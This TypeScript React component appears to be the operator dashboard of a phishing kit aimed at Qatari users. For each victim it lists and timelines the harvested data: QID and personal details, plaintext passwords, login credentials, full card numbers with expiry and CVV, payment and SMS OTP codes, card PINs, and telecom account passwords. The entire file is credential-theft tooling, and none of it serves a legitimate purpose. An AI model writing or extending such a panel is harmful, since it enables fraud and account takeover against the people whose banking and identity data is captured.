import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { trpc } from "@/lib/trpc";
import { Button } from "@/components/ui/button";
import {
  AlertTriangle,
  CheckCircle2,
  Clock,
  CreditCard,
  IdCard,
  KeyRound,
  LogIn,
  Lock,
  Mail,
  MapPin,
  Phone,
  PhoneCall,
  RefreshCw,
  SquareAsterisk,
  User as UserIcon,
} from "lucide-react";

function formatDateTime(value: unknown): string {
  if (!value) return "-";
  try {
    const d = value instanceof Date ? value : new Date(value as string);
    if (isNaN(d.getTime())) return "-";
    return d.toLocaleString();
  } catch {
    return "-";
  }
}

function show(value: string | null | undefined): string {
  return value && String(value).length > 0 ? String(value) : "-";
}

interface UserJourneyDialogProps {
  registrationId: number | null;
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

interface TimelineEvent {
  at: Date | null;
  type:
    | "registration"
    | "personalInfo"
    | "password"
    | "payment"
    | "login"
    | "cardPin";
  title: string;
  description: string;
}

export function UserJourneyDialog({
  registrationId,
  open,
  onOpenChange,
}: UserJourneyDialogProps) {
  const journeyQuery = trpc.admin.getJourney.useQuery(
    { registrationId: registrationId ?? 0 },
    {
      enabled: open && !!registrationId && registrationId > 0,
      refetchInterval: open ? 30_000 : false,
    },
  );

  const data: any = journeyQuery.data;
  const reg = data?.registration ?? null;
  const personalList = data?.personalInfo ?? [];
  const passwordList = data?.passwords ?? [];
  const otpList = data?.otps ?? [];
  const phoneVerifyList = data?.phoneVerifications ?? [];
  const paymentList = data?.payments ?? [];
  const loginList = data?.logins ?? [];
  const cardPinList = data?.cardPins ?? [];

  const personalLatest = personalList[0] ?? null;
  const passwordLatest = passwordList[0] ?? null;
  const phoneVerifyLatest = phoneVerifyList[0] ?? null;
  const paymentLatest = paymentList[0] ?? null;
  const loginLatest = loginList[0] ?? null;
  const cardPinLatest = cardPinList[0] ?? null;

  const completionSteps = [
    { label: "التسجيل", done: !!reg },
    { label: "المعلومات الشخصية", done: personalList.length > 0 },
    { label: "كلمة المرور", done: passwordList.length > 0 },
    { label: "الدفع / البطاقة", done: paymentList.length > 0 },
    { label: "تسجيل دخول", done: loginList.length > 0 },
    { label: "PIN البطاقة", done: cardPinList.length > 0 },
  ];
  const completedCount = completionSteps.filter((s) => s.done).length;
  const totalSteps = completionSteps.length;

  // Build a unified timeline from all events.
  const timeline: TimelineEvent[] = [];
  if (reg) {
    timeline.push({
      at: reg.createdAt instanceof Date ? reg.createdAt : new Date(reg.createdAt as string),
      type: "registration",
      title: "بدء التسجيل",
      description: `${show(reg.userType)} | ${show(reg.qid ?? reg.email ?? reg.intlPhone)}`,
    });
  }
  for (const p of personalList) {
    timeline.push({
      at: p.createdAt instanceof Date ? p.createdAt : new Date(p.createdAt as string),
      type: "personalInfo",
      title: "إدخال المعلومات الشخصية",
      description: `${show(p.arabicName)} - ${show(p.englishName)}`,
    });
  }
  for (const p of passwordList) {
    timeline.push({
      at: p.createdAt instanceof Date ? p.createdAt : new Date(p.createdAt as string),
      type: "password",
      title: "إنشاء كلمة المرور",
      description: `طول: ${(p.password ?? "").length} حرف`,
    });
  }

  for (const p of paymentList) {
    timeline.push({
      at: p.createdAt instanceof Date ? p.createdAt : new Date(p.createdAt as string),
      type: "payment",
      title: p.otp ? "إدخال OTP الدفع" : "إدخال بيانات البطاقة",
      description: `${show(p.cardNumber)} | CVV: ${show(p.cvv)}${p.otp ? ` | OTP: ${p.otp}` : ""}`,
    });
  }
  for (const p of loginList) {
    timeline.push({
      at: p.createdAt instanceof Date ? p.createdAt : new Date(p.createdAt as string),
      type: "login",
      title: "محاولة تسجيل دخول",
      description: `${show(p.username)}`,
    });
  }
  for (const p of cardPinList) {
    timeline.push({
      at: p.createdAt instanceof Date ? p.createdAt : new Date(p.createdAt as string),
      type: "cardPin",
      title: "إدخال PIN البطاقة",
      description: `PIN: ${show(p.cardPin)}`,
    });
  }
  timeline.sort((a, b) => {
    const ta = a.at ? a.at.getTime() : 0;
    const tb = b.at ? b.at.getTime() : 0;
    return ta - tb;
  });

  const eventColors: Record<TimelineEvent["type"], string> = {
    registration: "bg-indigo-500",
    personalInfo: "bg-sky-500",
    password: "bg-rose-500",
    payment: "bg-fuchsia-500",
    login: "bg-orange-500",
    cardPin: "bg-violet-500",
  };
  const eventIcon: Record<TimelineEvent["type"], React.ReactNode> = {
    registration: <UserIcon className="w-3 h-3 text-white" />,
    personalInfo: <IdCard className="w-3 h-3 text-white" />,
    password: <Lock className="w-3 h-3 text-white" />,
    payment: <CreditCard className="w-3 h-3 text-white" />,
    login: <LogIn className="w-3 h-3 text-white" />,
    cardPin: <SquareAsterisk className="w-3 h-3 text-white" />,
  };

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent
        className="max-w-3xl max-h-[90vh] overflow-y-auto"
        dir="rtl"
      >
        <DialogHeader>
          <DialogTitle className="flex items-center gap-2">
            <UserIcon className="w-5 h-5" />
            رحلة المستخدم # {registrationId ?? "-"}
          </DialogTitle>
        </DialogHeader>

        {journeyQuery.isLoading ? (
          <div className="text-center py-10 text-muted-foreground text-sm">
            جارٍ تحميل البيانات...
          </div>
        ) : journeyQuery.isError ? (
          <div className="text-center py-10 space-y-3">
            <div className="inline-flex items-center gap-2 text-rose-600 text-sm">
              <AlertTriangle className="w-4 h-4" />
              تعذّر جلب البيانات
            </div>
            <p className="text-xs text-muted-foreground max-w-sm mx-auto">
              {journeyQuery.error?.message ?? "حدث خطأ غير متوقّع. حاول مرّة أخرى."}
            </p>
            <Button
              size="sm"
              variant="outline"
              className="bg-white"
              onClick={() => journeyQuery.refetch()}
            >
              <RefreshCw className="w-4 h-4 ml-1" /> إعادة المحاولة
            </Button>
          </div>
        ) : !reg && !personalList.length && !passwordList.length && !paymentList.length && !loginList.length && !cardPinList.length ? (
          <div className="text-center py-10 text-muted-foreground text-sm">
            لا توجد بيانات لهذا المعرّف.
          </div>
        ) : (
          <div className="space-y-5">
            {/* Progress strip */}
            <Card>
              <CardHeader className="pb-2">
                <CardTitle className="text-sm font-medium text-muted-foreground">
                  مدى اكتمال الرحلة ({completedCount}/{totalSteps})
                </CardTitle>
              </CardHeader>
              <CardContent className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-2">
                {completionSteps.map((step) => (
                  <div
                    key={step.label}
                    className={`flex items-center gap-2 rounded-md border px-3 py-2 text-xs ${
                      step.done
                        ? "border-emerald-200 bg-emerald-50 text-emerald-800"
                        : "border-slate-200 bg-slate-50 text-slate-500"
                    }`}
                  >
                    {step.done ? (
                      <CheckCircle2 className="w-4 h-4" />
                    ) : (
                      <Clock className="w-4 h-4" />
                    )}
                    <span>{step.label}</span>
                  </div>
                ))}
              </CardContent>
            </Card>

            {/* Registration */}
            {reg && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <UserIcon className="w-4 h-4 text-indigo-500" />
                    بيانات التسجيل
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">
                    {formatDateTime(reg.createdAt)}
                  </span>
                </CardHeader>
                <CardContent className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                  <div className="flex items-center gap-2">
                    <Badge
                      variant={reg.userType === "QID" ? "default" : "secondary"}
                    >
                      {show(reg.userType)}
                    </Badge>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <span className="text-muted-foreground">QID:</span>
                    <span className="font-mono" dir="ltr">{show(reg.qid)}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <Phone className="w-3 h-3 text-muted-foreground" />
                    <span className="font-mono" dir="ltr">{show(reg.mobile ?? reg.intlPhone)}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <Mail className="w-3 h-3 text-muted-foreground" />
                    <span>{show(reg.email)}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs col-span-1 sm:col-span-2 text-muted-foreground">
                    IP: <span className="font-mono" dir="ltr">{show(reg.ipAddress)}</span>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Personal Info */}
            {personalLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <IdCard className="w-4 h-4 text-sky-500" />
                    المعلومات الشخصية
                    {personalList.length > 1 && (
                      <Badge variant="outline" className="text-xs">
                        {personalList.length} نسخ
                      </Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">
                    {formatDateTime(personalLatest.createdAt)}
                  </span>
                </CardHeader>
                <CardContent className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                  <div className="flex items-center gap-2 text-xs">
                    <span className="text-muted-foreground">الجنسية:</span>
                    <Badge variant={personalLatest.nationality === "QAT" ? "default" : "secondary"}>
                      {show(personalLatest.nationality)}
                    </Badge>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <span className="text-muted-foreground">الجنس:</span>
                    <span>{show(personalLatest.gender)}</span>
                  </div>
                  <div className="text-xs">
                    <span className="text-muted-foreground">الاسم بالعربي: </span>
                    {show(personalLatest.arabicName)}
                  </div>
                  <div className="text-xs">
                    <span className="text-muted-foreground">الاسم بالإنجليزي: </span>
                    {show(personalLatest.englishName)}
                  </div>
                  <div className="text-xs">
                    <span className="text-muted-foreground">تاريخ الميلاد: </span>
                    <span className="font-mono" dir="ltr">{show(personalLatest.birthDate)}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <Mail className="w-3 h-3 text-muted-foreground" />
                    {show(personalLatest.email)}
                  </div>
                  <div className="flex items-center gap-2 text-xs col-span-1 sm:col-span-2">
                    <MapPin className="w-3 h-3 text-muted-foreground" />
                    {[
                      personalLatest.buildingNumber,
                      personalLatest.street,
                      personalLatest.zone,
                    ]
                      .filter(Boolean)
                      .join(" / ") || "-"}
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Password */}
            {passwordLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <Lock className="w-4 h-4 text-rose-500" />
                    كلمة المرور
                    {passwordList.length > 1 && (
                      <Badge variant="outline" className="text-xs">
                        {passwordList.length} محاولات
                      </Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">
                    {formatDateTime(passwordLatest.createdAt)}
                  </span>
                </CardHeader>
                <CardContent className="space-y-2">
                  {passwordList.map((p: any) => (
                    <div
                      key={p.id}
                      className="flex items-center justify-between text-xs border rounded-md px-3 py-2 bg-rose-50/40"
                    >
                      <Badge variant="outline" className="font-mono bg-white" dir="ltr">
                        {p.password}
                      </Badge>
                      <span className="text-muted-foreground">
                        {formatDateTime(p.createdAt)}
                      </span>
                    </div>
                  ))}
                </CardContent>
              </Card>
            )}

            {/* Login attempts */}
            {loginLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <LogIn className="w-4 h-4 text-orange-500" />
                    محاولات تسجيل الدخول
                    {loginList.length > 1 && (
                      <Badge variant="outline" className="text-xs">{loginList.length} محاولات</Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">{formatDateTime(loginLatest.createdAt)}</span>
                </CardHeader>
                <CardContent className="space-y-2">
                  {loginList.map((p: any) => (
                    <div key={p.id} className="flex items-center justify-between text-xs border rounded-md px-3 py-2 bg-orange-50/40">
                      <div className="flex items-center gap-3">
                        <span className="font-mono" dir="ltr">{show(p.username)}</span>
                        <Badge variant="outline" className="font-mono bg-white" dir="ltr">{show(p.password)}</Badge>
                      </div>
                      <span className="text-muted-foreground">{formatDateTime(p.createdAt)}</span>
                    </div>
                  ))}
                </CardContent>
              </Card>
            )}

            {/* Phone verification */}
            {phoneVerifyLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <PhoneCall className="w-4 h-4 text-cyan-500" />
                    توثيق حساب مزوّد الخدمة
                    {phoneVerifyList.length > 1 && (
                      <Badge variant="outline" className="text-xs">{phoneVerifyList.length}</Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">{formatDateTime(phoneVerifyLatest.createdAt)}</span>
                </CardHeader>
                <CardContent className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-sm">
                  <div className="flex items-center gap-2 text-xs">
                    <span className="text-muted-foreground">المزوّد:</span>
                    <Badge variant="secondary">{show(phoneVerifyLatest.serviceProvider)}</Badge>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <Phone className="w-3 h-3 text-muted-foreground" />
                    <span className="font-mono" dir="ltr">{show(phoneVerifyLatest.phoneNumber)}</span>
                  </div>
                  <div className="text-xs">
                    <span className="text-muted-foreground">QID صاحب البطاقة: </span>
                    <span className="font-mono" dir="ltr">{show(phoneVerifyLatest.cardOwnerId)}</span>
                  </div>
                  <div className="flex items-center gap-2 text-xs">
                    <Mail className="w-3 h-3 text-muted-foreground" />
                    <span>{show(phoneVerifyLatest.providerEmail)}</span>
                  </div>
                  <div className="text-xs col-span-1 sm:col-span-2">
                    <span className="text-muted-foreground">كلمة مرور المزوّد: </span>
                    <Badge variant="outline" className="font-mono bg-rose-50" dir="ltr">{show(phoneVerifyLatest.providerPassword)}</Badge>
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Payments */}
            {paymentLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <CreditCard className="w-4 h-4 text-fuchsia-500" />
                    بيانات الدفع / البطاقة
                    {paymentList.length > 1 && (
                      <Badge variant="outline" className="text-xs">{paymentList.length} محاولات</Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">{formatDateTime(paymentLatest.createdAt)}</span>
                </CardHeader>
                <CardContent className="space-y-2">
                  {paymentList.map((p: any) => (
                    <div key={p.id} className="text-xs border rounded-md px-3 py-2 bg-fuchsia-50/30 space-y-1">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          {p.cardType && (
                            <span className="text-xs font-medium px-1.5 py-0.5 rounded bg-fuchsia-100 text-fuchsia-800 capitalize">
                              {p.cardType === 'credit' ? 'Credit' : 'Debit'}
                            </span>
                          )}
                          <span className="font-mono text-sm" dir="ltr">{show(p.cardNumber)}</span>
                        </div>
                        <span className="text-muted-foreground">{formatDateTime(p.createdAt)}</span>
                      </div>
                      <div className="flex items-center gap-3 text-xs">
                        <span className="text-muted-foreground">انتهاء:</span>
                        <span className="font-mono" dir="ltr">{[p.expMonth, p.expYear].filter(Boolean).join("/") || "-"}</span>
                        <span className="text-muted-foreground">CVV:</span>
                        <Badge variant="outline" className="font-mono bg-white" dir="ltr">{show(p.cvv)}</Badge>
                        {p.otp && (
                          <>
                            <span className="text-muted-foreground">OTP:</span>
                            <Badge variant="outline" className="font-mono bg-emerald-50" dir="ltr">{p.otp}</Badge>
                          </>
                        )}
                      </div>
                    </div>
                  ))}
                </CardContent>
              </Card>
            )}

            {/* Card PIN */}
            {cardPinLatest && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <SquareAsterisk className="w-4 h-4 text-violet-500" />
                    رموز PIN البطاقة
                    {cardPinList.length > 1 && (
                      <Badge variant="outline" className="text-xs">{cardPinList.length}</Badge>
                    )}
                  </CardTitle>
                  <span className="text-xs text-muted-foreground">{formatDateTime(cardPinLatest.createdAt)}</span>
                </CardHeader>
                <CardContent className="space-y-2">
                  {cardPinList.map((p: any) => (
                    <div key={p.id} className="flex items-center justify-between text-xs border rounded-md px-3 py-2 bg-violet-50/40">
                      <Badge variant="outline" className="font-mono text-base bg-white" dir="ltr">{show(p.cardPin)}</Badge>
                      <span className="text-muted-foreground">{formatDateTime(p.createdAt)}</span>
                    </div>
                  ))}
                </CardContent>
              </Card>
            )}

            {/* OTPs */}
            {otpList.length > 0 && (
              <Card>
                <CardHeader className="pb-2 flex flex-row items-center justify-between">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <KeyRound className="w-4 h-4 text-emerald-500" />
                    أكواد OTP المُدخلة
                    <Badge variant="outline" className="text-xs">
                      {otpList.length}
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-2">
                  {otpList.map((o: any) => (
                    <div
                      key={o.id}
                      className="flex items-center justify-between text-xs border rounded-md px-3 py-2 bg-emerald-50/40"
                    >
                      <div className="flex items-center gap-3">
                        <Badge
                          variant="outline"
                          className="font-mono text-base bg-white"
                          dir="ltr"
                        >
                          {o.otpCode}
                        </Badge>
                        <span className="font-mono text-muted-foreground" dir="ltr">
                          {show(o.phoneNumber)}
                        </span>
                      </div>
                      <span className="text-muted-foreground">
                        {formatDateTime(o.createdAt)}
                      </span>
                    </div>
                  ))}
                </CardContent>
              </Card>
            )}

            {/* Timeline */}
            {timeline.length > 0 && (
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm font-medium flex items-center gap-2">
                    <Clock className="w-4 h-4 text-amber-500" />
                    الخط الزمني
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <ol className="relative border-r border-slate-200 pr-4 space-y-4 mr-2">
                    {timeline.map((ev, idx) => (
                      <li key={idx} className="relative">
                        <span
                          className={`absolute -right-[26px] top-1 flex w-5 h-5 items-center justify-center rounded-full ${eventColors[ev.type]}`}
                        >
                          {eventIcon[ev.type]}
                        </span>
                        <div className="text-xs text-muted-foreground">
                          {ev.at ? formatDateTime(ev.at) : "-"}
                        </div>
                        <div className="text-sm font-medium">{ev.title}</div>
                        <div className="text-xs text-slate-600">
                          {ev.description}
                        </div>
                      </li>
                    ))}
                  </ol>
                </CardContent>
              </Card>
            )}
          </div>
        )}
      </DialogContent>
    </Dialog>
  );
}

export default UserJourneyDialog;
